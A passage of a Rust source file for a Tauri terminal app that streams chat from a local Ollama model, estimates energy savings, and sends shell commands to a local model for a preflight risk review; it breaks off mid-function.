pub mod pty;

use std::{collections::HashMap, io::Read, sync::Arc, time::Duration};
use tokio::sync::Mutex;

const TERMINAL_BUFFER_MAX: usize = 16 * 1024;
const TERMINAL_LINES_MAX: usize = 400;
const DEFAULT_PREFLIGHT_MODEL: &str = "gemma3:270m";
const PREFLIGHT_SYSTEM_PROMPT: &str = "You are a senior security operations (SOC) analyst. Your job is to analyze a shell command for potential risks. Do not be conversational. Respond only in JSON with the following keys: summary (one sentence), is_risky (true/false), risk_reason (one paragraph), safe_alternative (optional string offering a safer approach).";
const PREFLIGHT_REPAIR_PROMPT: &str = "You are a JSON repair bot. Convert the provided text into valid JSON with the keys summary (string), is_risky (boolean), risk_reason (string), and safe_alternative (string, optional). Respond with JSON only.";
const PREFLIGHT_TEXT_PROMPT: &str = "You are a senior SOC analyst. Provide a concise assessment of a shell command using exactly three plain-text lines, no code fences or quoting: (1) 'Summary: <what the command does>' (2) 'Likelihood of maliciousness: <percentage 0-100>' (3) 'Rationale: <explain how an attacker could abuse the command or why it's risky>'. Keep the rationale focused on potential malicious impact rather than benign behavior.";

// --- Eco savings model -------------------------------------------------------
// Estimates what an equivalent cloud LLM API call would have cost in energy,
// water, and CO2, compared against the energy this machine actually spent on
// local inference. All figures are rough public estimates, kept conservative:
//
// - Cloud energy: ~0.34 Wh per median chatbot query of ~500 tokens (Epoch AI
//   estimate for GPT-4o-class serving, datacenter overhead included), scaled
//   linearly by token count.
// - Local energy: wall-clock inference time multiplied by a typical consumer
//   CPU/GPU package draw of 45 W.
// - Water: datacenters consume ~1.8 mL per Wh (onsite cooling plus offsite
//   electricity generation); home electricity only carries the generation
//   share, ~0.9 mL per Wh.
// - CO2: world-average grid intensity, ~0.4 g CO2e per Wh.
const CLOUD_WH_PER_1K_TOKENS: f64 = 0.68;
const LOCAL_DEVICE_WATTS: f64 = 45.0;
const WATER_ML_PER_WH_CLOUD: f64 = 1.8;
const WATER_ML_PER_WH_LOCAL: f64 = 0.9;
const CO2_G_PER_WH: f64 = 0.4;

use anyhow::Error;
use futures_util::StreamExt;
use once_cell::sync::Lazy;
use pty::{PtySize, PTY_REGISTRY};
use reqwest::Client;
use serde::{de::Error as _, Deserialize, Serialize};
use serde_json::json;
use tauri::{AppHandle, Emitter, Manager, State};
static HTTP_CLIENT: Lazy<Client> = Lazy::new(|| {
    // A total request timeout would cut off streamed chat responses that take
    // longer than the limit, so bound connect and per-read idle time instead.
    Client::builder()
        .connect_timeout(Duration::from_secs(5))
        .read_timeout(Duration::from_secs(120))
        .build()
        .expect("failed to initialize reqwest client")
});

type ReaderHandle = tauri::async_runtime::JoinHandle<()>;

struct AppState {
    readers: Arc<Mutex<HashMap<String, ReaderHandle>>>,
    terminal_snapshots: Arc<Mutex<HashMap<String, TerminalSnapshot>>>,
    system_info: Arc<std::sync::Mutex<sysinfo::System>>,
}

impl Default for AppState {
    fn default() -> Self {
        // Only global CPU and memory stats are consumed; new_all() would
        // enumerate every process on the machine at startup.
        let mut sys = sysinfo::System::new();
        sys.refresh_cpu();
        sys.refresh_memory();
        Self {
            readers: Default::default(),
            terminal_snapshots: Default::default(),
            system_info: Arc::new(std::sync::Mutex::new(sys)),
        }
    }
}


#[derive(Default, Clone)]
struct TerminalSnapshot {
    buffer: String,
}

impl TerminalSnapshot {
    fn append(&mut self, chunk: &str) {
        self.buffer.push_str(chunk);
        if self.buffer.len() > TERMINAL_BUFFER_MAX {
            // Round up to a char boundary: draining mid-character panics.
            let mut excess = self.buffer.len() - TERMINAL_BUFFER_MAX;
            while excess < self.buffer.len() && !self.buffer.is_char_boundary(excess) {
                excess += 1;
            }
            self.buffer.drain(..excess);
        }
    }

    fn last_lines(&self, limit: usize) -> String {
        if self.buffer.is_empty() {
            return String::new();
        }
        let lines: Vec<&str> = self.buffer.lines().rev().take(limit).collect();
        lines.into_iter().rev().collect::<Vec<_>>().join("\n")
    }
}

#[derive(Serialize)]
struct TerminalContextPayload {
    session_id: String,
    last_lines: String,
}

#[derive(Serialize, Clone)]
struct TerminalOutputPayload {
    session_id: String,
    data: String,
}

#[derive(Serialize, Clone)]
struct OllamaChunkPayload {
    content: Option<String>,
    done: bool,
    error: Option<String>,
}

#[derive(Serialize, Clone)]
struct EcoSavings {
    tokens: u64,
    energy_wh: f64,
    co2_g: f64,
    water_ml: f64,
}

fn compute_eco_savings(prompt_tokens: u64, output_tokens: u64, duration_ns: u64) -> EcoSavings {
    let tokens = prompt_tokens + output_tokens;
    let cloud_wh = (tokens as f64 / 1000.0) * CLOUD_WH_PER_1K_TOKENS;
    let local_wh = (duration_ns as f64 / 3.6e12) * LOCAL_DEVICE_WATTS; // ns -> hours
    let saved_wh = (cloud_wh - local_wh).max(0.0);
    let saved_water =
        (cloud_wh * WATER_ML_PER_WH_CLOUD - local_wh * WATER_ML_PER_WH_LOCAL).max(0.0);

    EcoSavings {
        tokens,
        energy_wh: saved_wh,
        co2_g: saved_wh * CO2_G_PER_WH,
        water_ml: saved_water,
    }
}

/// Emits the eco savings of one local LLM round-trip to the frontend.
fn emit_eco_savings(app_handle: &AppHandle, savings: EcoSavings) {
    let _ = app_handle.emit("eco-savings", savings);
}

/// Extracts token/duration stats from a non-streaming Ollama chat response
/// and reports the resulting savings.
fn emit_eco_from_response(app_handle: &AppHandle, payload: &serde_json::Value) {
    let prompt_tokens = payload
        .get("prompt_eval_count")
        .and_then(|value| value.as_u64())
        .unwrap_or(0);
    let output_tokens = payload
        .get("eval_count")
        .and_then(|value| value.as_u64())
        .unwrap_or(0);
    if prompt_tokens + output_tokens == 0 {
        return;
    }
    let duration_ns = payload
        .get("total_duration")
        .and_then(|value| value.as_u64())
        .unwrap_or(0);
    emit_eco_savings(
        app_handle,
        compute_eco_savings(prompt_tokens, output_tokens, duration_ns),
    );
}

#[derive(Deserialize)]
struct ResizeRequest {
    session_id: String,
    cols: u16,
    rows: u16,
    pixel_width: Option<u16>,
    pixel_height: Option<u16>,
}

#[derive(Deserialize)]
struct AskOllamaRequest {
    prompt: String,
    model: Option<String>,
    system_prompt: Option<String>,
    persona_prompt: Option<String>,
    terminal_context: Option<String>,
}

#[derive(Deserialize)]
struct AnalyzeCommandRequest {
    command: String,
    model: Option<String>,
}

#[derive(Serialize)]
#[serde(rename_all = "lowercase")]
enum AnalyzeAction {
    Run,
    Review,
    Error,
}

#[derive(Serialize, Deserialize)]
struct PreflightReport {
    summary: String,
    is_risky: bool,
    risk_reason: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    safe_alternative: Option<String>,
}

#[derive(Serialize)]
struct AnalyzeCommandResponse {
    action: AnalyzeAction,
    #[serde(skip_serializing_if = "Option::is_none")]
    report: Option<PreflightReport>,
    #[serde(skip_serializing_if = "Option::is_none")]
    message: Option<String>,
    score: i32,
}

#[derive(Deserialize)]
struct WriteRequest {
    session_id: String,
    data: String,
}

#[tauri::command]
async fn spawn_pty(state: State<'_, AppState>, app_handle: AppHandle) -> Result<String, String> {
    let (session_id, reader) = tauri::async_runtime::spawn_blocking(|| {
        let size = PtySize::default();
        let session_id = PTY_REGISTRY.create_session(size, None)?;
        let reader = PTY_REGISTRY.take_reader(&session_id)?;
        Ok::<_, Error>((session_id, reader))
    })
    .await
    .map_err(|err| err.to_string())?
    .map_err(|err| err.to_string())?;

    state
        .terminal_snapshots
        .lock()
        .await
        .insert(session_id.clone(), TerminalSnapshot::default());

    let reader_task = spawn_terminal_reader(
        app_handle,
        session_id.clone(),
        reader,
        state.terminal_snapshots.clone(),
    );
    state
        .readers
        .lock()
        .await
        .insert(session_id.clone(), reader_task);

    Ok(session_id)
}

#[tauri::command]
async fn write_to_pty(request: WriteRequest) -> Result<(), String> {
    let WriteRequest { session_id, data } = request;
    let bytes = data.into_bytes();

    tauri::async_runtime::spawn_blocking(move || {
        PTY_REGISTRY.with_session(&session_id, |session| session.write(&bytes))
    })
    .await
    .map_err(|err| err.to_string())?
    .map_err(|err| err.to_string())?;

    Ok(())
}

#[tauri::command]
async fn resize_pty(request: ResizeRequest) -> Result<(), String> {
    tauri::async_runtime::spawn_blocking(move || {
        PTY_REGISTRY.with_session(&request.session_id, |session| {
            let size = PtySize {
                cols: request.cols,
                rows: request.rows,
                pixel_width: request.pixel_width.unwrap_or_default(),
                pixel_height: request.pixel_height.unwrap_or_default(),
            };
            session.resize(size)
        })
    })
    .await
    .map_err(|err| err.to_string())?
    .map_err(|err| err.to_string())?;

    Ok(())
}

// rename_all keeps the JS-side key `session_id`: Tauri 2 would otherwise
// expect `sessionId`, silently failing every close and leaking the shell.
#[tauri::command(rename_all = "snake_case")]
async fn close_pty(state: State<'_, AppState>, session_id: String) -> Result<(), String> {
    let mut readers_guard = state.readers.lock().await;
    if let Some(task) = readers_guard.remove(&session_id) {
        task.abort();
    }

    let mut snapshots_guard = state.terminal_snapshots.lock().await;
    snapshots_guard.remove(&session_id);

    PTY_REGISTRY.remove_session(&session_id);

    Ok(())
}

#[tauri::command]
async fn ask_ollama(app_handle: AppHandle, request: AskOllamaRequest) -> Result<(), String> {
    let client = HTTP_CLIENT.clone();
    let AskOllamaRequest {
        prompt,
        model,
        system_prompt,
        persona_prompt,
        terminal_context,
    } = request;
    let model = model.unwrap_or_else(|| "llama3".to_string());

    let mut messages = Vec::new();

    if let Some(system_prompt) = system_prompt
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
    {
        messages.push(json!({
            "role": "system",
            "content": system_prompt,
        }));
    }

    if let Some(persona_prompt) = persona_prompt
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
    {
        messages.push(json!({
            "role": "system",
            "content": persona_prompt,
        }));
    }

    let user_prompt = if let Some(context) = terminal_context
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
    {
        format!(
            "Recent terminal output:\n{}\n\nUser request:\n{}",
            context, prompt
        )
    } else {
        prompt
    };

    messages.push(json!({
        "role": "user",
        "content": user_prompt,
    }));

    let body = json!({
        "model": model,
        "messages": messages,
        "stream": true
    });

    let response = client
        .post("http://127.0.0.1:11434/api/chat")
        .json(&body)
        .send()
        .await
        .map_err(|err| err.to_string())?;

    if !response.status().is_success() {
        let status = response.status();
        let detail = response.text().await.unwrap_or_default();
        let message = format!("Ollama responded with {}: {}", status, detail);
        emit_ollama_chunk(
            &app_handle,
            OllamaChunkPayload {
                content: None,
                done: true,
                error: Some(message.clone()),
            },
        );
        return Err(message);
    }

    let mut stream = response.bytes_stream();
    let mut buffer: Vec<u8> = Vec::new();

    while let Some(chunk) = stream.next().await {
        let data = chunk.map_err(|err| err.to_string())?;
        buffer.extend_from_slice(&data);
        process_ollama_buffer(&app_handle, &mut buffer)?;
    }

    if !buffer.is_empty() {
        buffer.push(b'\n');
        process_ollama_buffer(&app_handle, &mut buffer)?;
    }

    Ok(())
}

#[tauri::command]
async fn get_terminal_context(
    state: State<'_, AppState>,
    session_id: String,
    max_lines: Option<usize>,
) -> Result<TerminalContextPayload, String> {
    let max_lines = max_lines.unwrap_or(200).min(TERMINAL_LINES_MAX).max(1);
    let snapshots = state.terminal_snapshots.lock().await;
    let snapshot = snapshots
        .get(&session_id)
        .ok_or_else(|| format!("terminal session {session_id} not found"))?;

    Ok(TerminalContextPayload {
        session_id,
        last_lines: snapshot.last_lines(max_lines),
    })
}

#[tauri::command]
async fn check_ollama() -> Result<bool, String> {
    let response = HTTP_CLIENT
        .get("http://127.0.0.1:11434/api/tags")
        .send()
        .await;

    match response {
        Ok(res) => Ok(res.status().is_success()),
        Err(_) => Ok(false),
    }
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemContext {
    hostname: Option<String>,
    username: Option<String>,
    local_ip: Option<String>,
    git_branch: Option<String>,
    cwd: Option<String>,
    shell: Option<String>,
    ollama_online: bool,
    cpu_usage: Option<f32>,
    memory_usage: Option<f32>,
}

fn is_git_available() -> bool {
    static AVAILABLE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *AVAILABLE.get_or_init(|| {
        std::process::Command::new("git")
            .arg("--version")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .map(|status| status.success())
            .unwrap_or(false)
    })
}

const GIT_BRANCH_CACHE_TTL: Duration = Duration::from_secs(30);

static GIT_BRANCH_CACHE: Lazy<std::sync::Mutex<Option<(std::time::Instant, Option<String>)>>> =
    Lazy::new(|| std::sync::Mutex::new(None));

fn detect_git_branch(cwd: Option<&str>) -> Option<String> {
    use std::process::Command;

    if !is_git_available() {
        return None;
    }

    let run = |dir: &std::path::Path| {
        Command::new("git")
            .args(["rev-parse", "--abbrev-ref", "HEAD"])
            .current_dir(dir)
            .stdin(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .output()
            .ok()
            .filter(|output| output.status.success())
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
    };

    // Try from the executable's directory first (likely the project): go up
    // from target/debug to the project root.
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .and_then(|p| p.parent().map(|d| d.to_path_buf()));

    exe_dir
        .as_deref()
        .and_then(run)
        .or_else(|| cwd.map(std::path::Path::new).and_then(run))
}

/// The branch rarely changes, so don't fork `git` on every 5s context poll.
fn cached_git_branch(cwd: Option<&str>) -> Option<String> {
    {
        let cache = GIT_BRANCH_CACHE.lock().expect("git branch cache poisoned");
        if let Some((checked_at, branch)) = cache.as_ref() {
            if checked_at.elapsed() < GIT_BRANCH_CACHE_TTL {
                return branch.clone();
            }
        }
    }

    let branch = detect_git_branch(cwd);
    *GIT_BRANCH_CACHE.lock().expect("git branch cache poisoned") =
        Some((std::time::Instant::now(), branch.clone()));
    branch
}

#[tauri::command]
async fn get_system_context(
    state: State<'_, AppState>,
    _session_id: Option<String>,
) -> Result<SystemContext, String> {
    use std::env;

    let username = env::var("USER")
        .or_else(|_| env::var("USERNAME"))
        .ok();

    let shell = env::var("SHELL")
        .ok()
        .and_then(|s| s.split('/').last().map(String::from));

    let cwd = env::current_dir()
        .ok()
        .and_then(|p| p.to_str().map(String::from));

    // Subprocess spawns and sysinfo refreshes block, so keep them off the
    // async runtime's worker threads.
    let system_info = state.system_info.clone();
    let blocking_cwd = cwd.clone();
    let (hostname, git_branch, local_ip, cpu_usage, memory_usage) =
        tauri::async_runtime::spawn_blocking(move || {
            let hostname = hostname::get().ok().and_then(|h| h.into_string().ok());
            let git_branch = cached_git_branch(blocking_cwd.as_deref());
            let local_ip = get_local_ip();

            let mut sys = system_info.lock().expect("system info mutex poisoned");
            sys.refresh_cpu();
            sys.refresh_memory();

            let cpu = sys.global_cpu_info().cpu_usage();
            let total_mem = sys.total_memory();
            let used_mem = sys.used_memory();
            let mem = if total_mem > 0 {
                (used_mem as f64 / total_mem as f64 * 100.0) as f32
            } else {
                0.0
            };

            (hostname, git_branch, local_ip, cpu, mem)
        })
        .await
        .map_err(|err| err.to_string())?;

    // Check if Ollama is online
    let ollama_online = HTTP_CLIENT
        .get("http://127.0.0.1:11434/api/tags")
        .send()
        .await
        .map(|res| res.status().is_success())
        .unwrap_or(false);

    Ok(SystemContext {
        hostname,
        username,
        local_ip,
        git_branch,
        cwd,
        shell,
        ollama_online,
        cpu_usage: Some(cpu_usage),
        memory_usage: Some(memory_usage),
    })
}

fn get_local_ip() -> Option<String> {
    use std::net::UdpSocket;
    
    // Create a UDP socket and "connect" to a public address
    // This doesn't actually send data, just determines the local interface
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    let local_addr = socket.local_addr().ok()?;
    Some(local_addr.ip().to_string())
}

#[tauri::command]
async fn list_ollama_models() -> Result<Vec<String>, String> {
    let response = HTTP_CLIENT
        .get("http://127.0.0.1:11434/api/tags")
        .send()
        .await
        .map_err(|err| err.to_string())?;

    if !response.status().is_success() {
        let status = response.status();
        let detail = response.text().await.unwrap_or_default();
        return Err(format!(
            "Failed to fetch models from Ollama ({}): {}",
            status, detail
        ));
    }

    let data: OllamaTagsResponse = response.json().await.map_err(|err| err.to_string())?;

    let models = data.models.into_iter().map(|model| model.name).collect();
    Ok(models)
}

#[tauri::command]
async fn analyze_command(
    app_handle: AppHandle,
    request: AnalyzeCommandRequest,
) -> Result<AnalyzeCommandResponse, String> {
    let AnalyzeCommandRequest { command, model } = request;
    let command = command.trim().to_string();
    if command.is_empty() {
        return Ok(AnalyzeCommandResponse {
            action: AnalyzeAction::Run,
            report: None,
            message: None,
            score: 0,
        });
    }

    let lower_command = command.to_lowercase();

    let resolved_model = model
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| DEFAULT_PREFLIGHT_MODEL.to_string());

    let score = suspicion_score(&command);
    if score < 10 {
        return Ok(AnalyzeCommandResponse {
            action: AnalyzeAction::Run,
            report: None,
            message: None,
            score,
        });
    }

    let heuristic_reasons = collect_heuristic_reasons(&lower_command);
    let heuristic_flagged = !heuristic_reasons.is_empty();
    let heuristic_note = if heuristic_flagged {
        Some(format!(
            "Preflight heuristics flagged this command: {}.",
            heuristic_reasons.join("; ")
        ))
    } else {
        None
    };

    let body = json!({
        "model": resolved_model,
        "messages": [
            {"role": "system", "content": PREFLIGHT_SYSTEM_PROMPT},
            {
                "role": "user",
                "content": format!(
                    "Analyze this command and respond strictly with JSON:\n{}",
                    command
                ),
            }
        ],
        "stream": false
    });

    let response = HTTP_CLIENT
        .post("http://127.0.0.1:11434/api/chat")
        .json(&body)
        .send()
        .await
        .map_err(|err| err.to_string())?;

    if !response.status().is_success() {
        let status = response.status();
        let detail = response.text().await.unwrap_or_default();
        return Ok(AnalyzeCommandResponse {
            action: AnalyzeAction::Error,
            report: None,
            message: Some(format!("Ollama responded with {}: {}", status, detail)),
            score,
        });
    }

    let payload: serde_json::Value = response.json().await.map_err(|err| err.to_string())?;
    emit_eco_from_response(&app_handle, &payload);
    let content = payload
        .get("message")
        .and_then(|msg| msg.get("content"))
        .and_then(|value| value.as_str())
        .unwrap_or("");

    let parsed_report: Option<PreflightReport> = match parse_preflight_report(content) {
        Ok(report) => Some(report),
        Err(parse_error) => match repair_preflight_report(&app_handle, &resolved_model, content).await {
            Ok(Some(report)) => Some(report),
            Ok(None) => {
                let assessment = fallback_text_summary(&app_handle, &resolved_model, &command, content, Some(&parse_error))
                    .await
                    .unwrap_or_else(|fallback_error| {
                        format!(
                            "Structured risk report unavailable ({}; fallback failed: {}). Original model output:\n{}",
                            parse_error,
                            fallback_error,
                            content.trim()
                        )
                    });

                if let Some(mut report) = assessment_text_to_report(&assessment) {
                    if let Some(note) = heuristic_note.as_deref() {
                        report.risk_reason = format!("{}\n\n{}", report.risk_reason, note);
                    }
                    return Ok(AnalyzeCommandResponse {
                        action: AnalyzeAction::Review,
                        report: Some(report),
                        message: None,
                        score,
                    });
                }

                let message = if let Some(note) = heuristic_note.as_deref() {
                    format!("{}\n\n{}", assessment, note)
                } else {
                    assessment
                };

                return Ok(AnalyzeCommandResponse {
                    action: AnalyzeAction::Review,
                    report: None,
                    message: Some(message),
                    score,
                });
            }
            Err(repair_error) => {
                let assessment = fallback_text_summary(&app_handle, &resolved_model, &command, content, Some(&parse_error))
                    .await
                    .unwrap_or_else(|fallback_error| {
                        format!(
                            "Structured risk report unavailable ({}; repair failed: {}; fallback failed: {}). Original model output:\n{}",
                            parse_error,
                            repair_error,
                            fallback_error,
                            content.trim()
                        )
                    });

                if let Some(mut report) = assessment_text_to_report(&assessment) {
                    if let Some(note) = heuristic_note.as_deref() {
                        report.risk_reason = format!("{}\n\n{}", report.risk_reason, note);
                    }
                    return Ok(AnalyzeCommandResponse {
                        action: AnalyzeAction::Review,
                        report: Some(report),
                        message: None,
                        score,
                    });
                }

                let message = if let Some(note) = heuristic_note.as_deref() {
                    format!("{}\n\n{}", assessment, note)
                } else {
                    assessment
                };

                return Ok(AnalyzeCommandResponse {
                    action: AnalyzeAction::Review,
                    report: None,
                    message: Some(message),
                    score,
                });
            }
        },
    };

    if let Some(report) = parsed_report {
        if report.is_risky {
            return Ok(AnalyzeCommandResponse {
                action: AnalyzeAction::Review,
                report: Some(report),
                message: heuristic_note.clone(),
                score,
            });
        }

        if heuristic_flagged {
            return Ok(AnalyzeCommandResponse {
                action: AnalyzeAction::Review,
                report: Some(report),
                message: heuristic_note.clone(),
                score,
            });
        }
        return Ok(AnalyzeCommandResponse {
            action: AnalyzeAction::Run,
            report: Some(report),
            message: None,
            score,
        });
    }

    Ok(AnalyzeCommandResponse {
        action: AnalyzeAction::Run,
        report: None,
        message: Some("No AI report was produced.".to_string()),
        score,
    })
}

fn parse_preflight_report(content: &str) -> Result<PreflightReport, serde_json::Error> {
    let mut candidates: Vec<String> = Vec::new();
    candidates.push(content.trim().to_string());
    if let Some(clean) = strip_code_fence(content) {
        candidates.push(clean);
    }
    if let Some(extracted) = extract_json_object(content) {
        candidates.push(extracted);
    }

    let mut last_error: Option<serde_json::Error> = None;

    for candidate in candidates {
        match serde_json::from_str::<PreflightReport>(&candidate) {
            Ok(report) => return Ok(report),
            Err(err) => {
                last_error = Some(err);
                if let Ok(report) = json5::from_str::<PreflightReport>(&candidate) {
                    return Ok(report);
                }
                if let Some(fixed) = insert_missing_commas(&candidate) {
                    if let Ok(report) = serde_json::from_str::<PreflightReport>(&fixed) {
                        return Ok(report);
                    }
                    if let Ok(report) = json5::from_str::<PreflightReport>(&fixed) {
                        return Ok(report);
                    }
                }
                if let Some(backtick_fixed) = replace_quotes_inside_backticks(&candidate) {
                    if let Ok(report) = serde_json::from_str::<PreflightReport>(&backtick_fixed) {
                        return Ok(report);
                    }
                    if let Ok(report) = json5::from_str::<PreflightReport>(&backtick_fixed) {
                        return Ok(report);
                    }
                }
            }
        }
    }

    Err(last_error.unwrap_or_else(|| serde_json::Error::custom("Unable to parse preflight report")))
}

fn strip_code_fence(raw: &str) -> Option<String> {
    let trimmed = raw.trim();
    let without_prefix = if let Some(rest) = trimmed.strip_prefix("```json") {
        Some(rest)
    } else {
        trimmed.strip_prefix("```")
    }?;

    Some(
        without_prefix
            .trim()
            .trim_end_matches("```")
            .trim()
            .to_string(),
    )
}

fn extract_json_object(raw: &str) -> Option<String> {
    let mut depth = 0usize;
    let mut start: Option<usize> = None;

    for (idx, ch) in raw.char_indices() {
        match ch {
            '{' => {
                if depth == 0 {
                    start = Some(idx);
                }
                depth += 1;
            }
            '}' => {
                if depth > 0 {
                    depth -= 1;
                    if depth == 0 {
                        if let Some(begin) = start {
                            let end = idx + ch.len_utf8();
                            return Some(raw[begin..end].to_string());
                        }
                    }
                }
            }
            _ => {}
        }
    }

    None
}

fn insert_missing_commas(input: &str) -> Option<String> {
    let lines: Vec<&str> = input.lines().collect();
    if lines.is_empty() {
        return None;
    }

    let mut modified = false;
    let mut output: Vec<String> = Vec::with_capacity(lines.len());

    for (idx, line) in lines.iter().enumerate() {
        let mut current = (*line).to_string();
        let trimmed = current.trim();
        if looks_like_field(trimmed) && !trimmed.ends_with(',') {
            if next_significant_line(&lines, idx + 1)
                .map(|next| {
                    let nt = next.trim_start();
                    !nt.starts_with('}') && !nt.starts_with(']')
                })
                .unwrap_or(false)
            {
                current.push(',');
                modified = true;
            }
        }
        output.push(current);
    }

    if modified {
        Some(output.join("\n"))
    } else {
        None
    }
}

fn looks_like_field(line: &str) -> bool {
    if line.is_empty() {
        return false;
    }

    let first = line.chars().next().unwrap();
    let has_colon = line.contains(':');
    if !has_colon {
        return false;
    }

    if first == '"' || first == '\'' {
        return true;
    }

    first.is_ascii_alphabetic()
}

fn next_significant_line<'a>(lines: &[&'a str], mut idx: usize) -> Option<&'a str> {
    while idx < lines.len() {
        let line = lines[idx].trim();
        if !line.is_empty() {
            return Some(lines[idx]);
        }
        idx += 1;
    }
    None
}

fn sanitize_plain_text_assessment(raw: &str) -> String {
    let mut content = raw.trim().to_string();

    if let Some(clean) = strip_code_fence(&content) {
        content = clean.trim().to_string();
    }

    if content.starts_with("text ") {
        content = content[5..].trim_start().to_string();
    }

    content = content
        .trim_matches(|ch| ch == '"' || ch == '\'' || ch == '`')
        .trim()
        .to_string();

    let filtered_lines: Vec<&str> = content
        .lines()
        .map(str::trim)
        .filter(|line| {
            !(line.starts_with("Command to review")
                || line.starts_with("Previous model output")
                || line.starts_with("Original parser error"))
        })
        .collect();

    let cleaned = filtered_lines.join("\n").trim().to_string();
    if cleaned.is_empty() {
        content
    } else {
        cleaned
    }
}

fn assessment_text_to_report(text: &str) -> Option<PreflightReport> {
    let mut summary: Option<String> = None;
    let mut rationale: Option<String> = None;
    let mut likelihood: Option<f32> = None;
    let mut safe_alternative: Option<String> = None;

    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let lower = trimmed.to_ascii_lowercase();
        if lower.starts_with("summary:") {
            if let Some(value) = trimmed.splitn(2, ':').nth(1) {
                let value = value.trim();
                if !value.is_empty() {
                    summary = Some(value.to_string());
                }
            }
            continue;
        }
        if lower.starts_with("likelihood") {
            if let Some(value) = trimmed.splitn(2, ':').nth(1) {
                likelihood = parse_percentage(value.trim());
            }
            continue;
        }
        if lower.starts_with("rationale:") {
            if let Some(value) = trimmed.splitn(2, ':').nth(1) {
                let value = value.trim();
                if !value.is_empty() {
                    rationale = Some(value.to_string());
                }
            }
            continue;
        }
        if lower.starts_with("recommendation:") || lower.starts_with("mitigation:") {
            if let Some(value) = trimmed.splitn(2, ':').nth(1) {
                let value = value.trim();
                if !value.is_empty() {
                    safe_alternative = Some(value.to_string());
                }
            }
            continue;
        }
    }

    let summary = summary.or_else(|| {
        text.lines()
            .find(|line| !line.trim().is_empty())
            .map(|line| line.trim().to_string())
    })?;

    let mut risk_reason = rationale.unwrap_or_else(|| summary.clone());
    if let Some(value) = likelihood {
        let label = if value >= 70.0 {
            "high"
        } else if value >= 40.0 {
            "medium"
        } else if value >= 15.0 {
            "low"
        } else {
            "very low"
        };
        risk_reason = format!(
            "{} (assessed malicious likelihood: {}% — {} risk)",
            risk_reason, value, label
        );
    }

    let is_risky = likelihood.map(|value| value >= 20.0).unwrap_or(true);

    Some(PreflightReport {
        summary,
        is_risky,
        risk_reason,
        safe_alternative,
    })
}

fn parse_percentage(value: &str) -> Option<f32> {
    let cleaned = value
        .trim()
        .trim_end_matches('%')
        .trim()
        .replace('%', "")
        .replace(|ch: char| ch == ',', "");
    cleaned.parse::<f32>().ok()
}

fn replace_quotes_inside_backticks(input: &str) -> Option<String> {
    let mut output = String::with_capacity(input.len());
    let mut in_backtick = false;
    let mut changed = false;

    for ch in input.chars() {
        if ch == '`' {
            in_backtick = !in_backtick;
            output.push(ch);
            continue;
        }

        if in_backtick && ch == '"' {
            output.push('\'');
            changed = true;
        } else {
            output.push(ch);
        }
    }

    if changed {
        Some(output)
    } else {
        None
    }
}

async fn repair_preflight_report(
    app_handle: &AppHandle,
    model: &str,
    raw_content: &str,
) -> Result<Option<PreflightReport>, String> {
    if raw_content.trim().is_empty() {
        return Ok(None);
    }

    let body = json!({
        "model": model,
        "messages": [
            {"role": "system", "content": PREFLIGHT_REPAIR_PROMPT},
            {
                "role": "user",
                "content": format!(
                    "Convert the following text into valid JSON with the required keys:\n{}",
                    raw_content
                ),
            }
        ],
        "stream": false
    });

    let response = HTTP_CLIENT
        .post("http://127.0.0.1:11434/api/chat")
        .json(&body)
        .send()
        .await
        .map_err(|err| err.to_string())?;

    if !response.status().is_success() {
        let status = response.status();
        let detail = response.text().await.unwrap_or_default();
        return Err(format!("repair request failed with {}: {}", status, detail));
    }

    let payload: serde_json::Value = response.json().await.map_err(|err| err.to_string())?;
    emit_eco_from_response(app_handle, &payload);
    let content = payload
        .get("message")
        .and_then(|msg| msg.get("content"))
        .and_then(|value| value.as_str())
        .unwrap_or("")
        .trim()
        .to_string();

    if content.is_empty() {
        return Ok(None);
    }

    match parse_preflight_report(&content) {
        Ok(report) => Ok(Some(report)),
        Err(_) => Ok(None),
    }
}

async fn fallback_text_summary(
    app_handle: &AppHandle,
    model: &str,
    command: &str,
    raw_content: &str,
    parse_error: Option<&serde_json::Error>,
) -> Result<String, String> {
    let mut context = format!("Command to review:\n{}\n", command);
    if !raw_content.trim().is_empty() {
        context.push_str("\nPrevious model output (may be malformed JSON):\n");
        context.push_str(raw_content.trim());
    }
    if let Some(err) = parse_error {
        context.push_str(&format!("\n\nOriginal parser error: {}", err));
    }

    let body = json!({
        "model": model,
        "messages": [
            {"role": "system", "content": PREFLIGHT_TEXT_PROMPT},
            {"role": "user", "content": context},
        ],
        "stream": false
    });

    let response = HTTP_CLIENT
        .post("http://127.0.0.1:11434/api/chat")
        .json(&body)
        .send()
        .await
        .map_err(|err| err.to_string())?;

    if !response.status().is_success() {
        let status = response.status();
        let detail = response.text().await.unwrap_or_default();
        return Err(format!(
            "fallback request failed with {}: {}",
            status, detail
        ));
    }

    let payload: serde_json::Value = response.json().await.map_err(|err| err.to_string())?;
    emit_eco_from_response(app_handle, &payload);
    let content = payload
        .get("message")
        .and_then(|msg| msg.get("content"))
        .and_then(|value| value.as_str())
        .unwrap_or("")
        .trim()
        .to_string();

    if content.is_empty() {
        return Err("fallback summary came back empty".into());
    }

    Ok(sanitize_plain_text_assessment(&content))
}

fn process_ollama_buffer(app_handle: &AppHandle, buffer: &mut Vec<u8>) -> Result<(), String> {
    loop {
        let Some(position) = buffer.iter().position(|b| *b == b'\n') else {
            break;
        };

        let line: Vec<u8> = buffer.drain(..=position).collect();
        let trimmed = line[..line.len().saturating_sub(1)].to_vec();
